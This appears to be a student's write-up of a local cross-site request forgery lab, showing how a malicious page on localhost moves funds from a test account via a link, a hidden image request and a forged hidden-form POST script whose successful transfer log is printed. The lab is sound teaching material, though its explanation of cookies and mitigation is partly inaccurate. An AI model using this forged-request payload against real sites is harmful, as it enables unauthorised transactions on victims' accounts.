# Cross Site Request Forgery
In this lab we're going investigate the vulnerable program's repos.

Lets start by install dependencies with `npm i` after navigating to the directory the directory.
Then we start the servers with `npm run start` and navigate to __http://localhost:3000__ for the target site and __http://localhost:3001__ for the vulnerable. 

When opening the target site, you log in with bob and test as the username and password respectively and you see Bob's balance of 500 and the ability to send monies. 

When going to the malicous site you see the session persisted across tabs and that the balance decreased by 25. To verify I refreshed the target site and it did decrease accordingly. This shows that just accessing the malicous site you lose 25 units. One can infer that the money is being sent to another account. 

When looking over the html files, the target site seems plain and basic, but the malicious site has a link that transfers funds to alice's account. This is the reason the accounts funds decreased. 

There is also a commented out image, that has a request to decrease funds to the target server. So when I uncomment and restart the server and connect to the target site, I don't see an image. However if you go back to the target site and refresh you see you lost 15 units from the account. This proves you can send requests simply by embedding them in images that nobody can see. This is due to HTML's `<img>` tag's properties, it enables the developer to send a request to another server on page load. One of the original use cases for this tag is to load images from another source like a cdn to minimize the distance of large data sent. 

When looking at the server one can see that the cookies don't use a secret and are unencrypted making it easy for the malicious site to access and use the login's session from the target site's to make requests as the session's user.

Now to prove we understand what's going on here lets conduct an attack of our own.

I added this function to the javascript to falsify a form that submits a post request to the server:
```
    <script>
		//enter code here for malicious code. Use code from lecture.
		function forge_post(){
			var form = document.createElement("form");
			form.setAttribute("method", "POST");
			form.setAttribute("action", "http://localhost:3000/transfer");

			var toField = document.createElement("input");
			toField.setAttribute("type", "hidden");
			toField.setAttribute("name", "to");
			toField.setAttribute("value", "alice");
			form.appendChild(toField);

			var amountField = document.createElement("input");
			amountField.setAttribute("type", "hidden");
			amountField.setAttribute("name", "amount");
			amountField.setAttribute("value", "10");
			form.appendChild(amountField);

			document.body.appendChild(form);
			form.submit();

		}
	</script>
```
All this javascript does is create a new form with hidden html attributes so the user cannot see what we're doing. The attributes have the corresponding name that the server takes and have the prepared values attatched. Then it ends by submitting the form to the target server. 

Then this tag to go with it:
```
  <div>
	<p>Get a post request working with this button here:</p>
	<button onclick="forge_post()">Send POST request</button>
  </div>
```

After restarting the server to apply the updates, I logged in to get the session cookie on the target site then proceeded to the malicious site to hit th html button which triggers the falsified form. To my delight, it worked like a charm and the target server logged:
```
Transferring funds (10) from "bob" to "alice"
New account balances:
{
  "bob": "475",
  "alice": "525"
}
```

After investigating this lab we learn the importance of server side stored sessions. If this target program used encrypted server-side session management. This alone would mitigate the attacks we implemented because we would have to overcome the hurdles of just obtaining the session itself.